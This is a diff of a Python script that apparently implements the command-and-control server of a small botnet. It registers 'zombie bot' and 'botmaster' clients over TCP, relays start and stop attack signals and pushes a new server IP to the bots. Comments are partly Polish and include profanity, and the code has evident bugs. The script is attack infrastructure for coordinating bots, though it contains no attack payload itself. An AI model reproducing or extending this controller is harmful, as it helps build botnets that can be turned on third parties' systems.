@@ -1,14 +1,17 @@
+import os
+import sys
 import socket
+import threading
 import time
-from _thread import start_new_thread
 
 startAttack: bool = False
 ip = '127.0.0.1'
 sqlDatabaseHosts = []
 sqlDatabaseTargetIP = []
+clientSockets = []
 
 
-def thread_for_botmaster(c, st):
+def thread_for_botmaster(c, st):  # wrzucic w while???
     global startAttack
     global ip
     print('Botmaster Connected')
@@ -28,6 +31,7 @@ def thread_for_botmaster(c, st):
     stop = str(c.recv(1).decode())
     print("stop:" + stop)
     if stop == 'x':
+        ip = str(c.recv(16).decode())
         startAttack = False
         print('Botmaster wants the attack to end')
 
@@ -42,8 +46,9 @@ def thread_for_zombieBot(c, addr):
             if pom == 1:  # pom == 1 indicates that the botmaster wants to stop an ongoing attack
                 c.send('0'.encode())
                 print('ending attack')
+                c.send(ip.encode())
                 pom = 0
-                #wyślij ip nowego serwera
+                # if an attack stoped send IP of the new server (from botmaster)
 
             time.sleep(1)
             continue
@@ -64,47 +69,97 @@ def thread_for_zombieBot(c, addr):
     c.close()
 
 
+def thread_for_checking_attack_status(soc, addr):
+    flag = False
+    while True:
+        if not startAttack and flag:
+            print("weszło")
+            time.sleep(5)
+            break
+        if startAttack and not flag:
+            flag = True
+
+
+# close all connected clients and Ssocket
+def closeConnections(soc):
+    for s in clientSockets:
+        s.detach()
+        s.close()
+        clientSockets.remove(s)
+    soc.close()
+
+
 if __name__ == '__main__':
-    x = 0
+
     host = '127.0.0.1'
-    host = '192.168.100.11'
+    # host = '192.168.100.11'
     port = 65432
     max_connections = 5
     pom = 0
+    x = 0
     socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     socket.bind((host, port))
     socket.listen(max_connections)
-
+    thread_array=[]
+    t = None
     try:
         while True:
             client_socket, addr = socket.accept()
+            clientSockets.append(client_socket)
 
-            data = client_socket.recv(1).decode()  # info about which client type is connected 1-bot 2-botmaster
+            data = client_socket.recv(1).decode()  # info about which client type is connected: 1-bot, 2-botmaster
             if int(data) == 1:
                 print('normal bot connected')
                 sqlDatabaseHosts.append(client_socket.getpeername())
                 print(sqlDatabaseHosts)
-                start_new_thread(thread_for_zombieBot, (client_socket, addr))
-            if int(data) == 2:
+                t1 = threading.Thread(target=thread_for_zombieBot, args=(client_socket, addr))
+                t1.start()
+                thread_array.append(t1)
+            elif int(data) == 2:
                 # todo: można zrobić jakiś proces logowania i walidacje
                 #
-                start_new_thread(thread_for_botmaster, (client_socket, addr))
-            if startAttack:
-                pom = 1
-                print("pom")
+                t2 = threading.Thread(target=thread_for_botmaster, args=(client_socket, addr))
+                t2.start()
+                thread_array.append(t2)
+            else:
+                print("Error: Wrong Value")
 
-            if not startAttack and pom == 1:
-                print("new server address")
-                #host = nowyadres
+            if x == 0:
+                t = threading.Thread(target=thread_for_checking_attack_status, args=(socket, addr))
+                t.start()
+                thread_array.append(t)
+                x = 1
 
-                socket.detach()
-                socket.close()
+            if t is not None:
+                if not t.is_alive():
+                    print("cleaning up")
 
-                socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                socket.bind((host, port))
-                socket.listen(max_connections)
+                    for thread in thread_array:
+                        if thread.is_alive():
+                            print("closing thread: "+thread)
+                            thread.join()
 
-                pom = 0
-    except KeyboardInterrupt:
+
+                    for s in clientSockets:
+
+                        s.detach()
+                        s.close()
+                        print("closing socket: " + s)
+                        clientSockets.remove(s)
+
+                    socket.detach()
+                    socket.close()
+                    client_socket.sendall("XkurwaD".encode())
+
+                    sys.exit(0)
+                    print("Wtf")
+
+
+    except :
+
         print("Server is closing")
-        socket.close()
+        closeConnections(socket)
+        quit()
+        sys.exit(0)
+
+    sys.exit(0)
